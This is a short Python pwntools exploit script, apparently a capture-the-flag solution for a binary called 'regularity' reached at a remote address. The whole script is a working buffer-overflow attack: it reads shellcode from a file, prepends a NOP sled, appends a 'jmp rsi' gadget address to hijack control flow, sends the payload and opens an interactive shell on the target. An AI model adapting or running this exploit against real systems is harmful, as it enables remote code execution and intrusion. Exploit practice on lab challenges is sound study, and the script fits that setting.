#!/usr/bin/python
import sys
import struct
from pwn import *

with open('shellcode.bin', 'rb') as sc:
    shellcode = sc.read()

context.log_level = 'error'

e = ELF("./regularity")
# p = process(e.path)
# p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())
p = remote('94.237.61.242', 56208)

lea_rsi_rsp_mov_edx_hex110_syscall = p32(0x40105c)
jmp_rsi = p32(0x401041)

payload_len = 256
num_nops = payload_len - len(shellcode)
payload = b'\x90'*num_nops
payload += shellcode
payload += jmp_rsi

p.send(payload)
p.interactive()
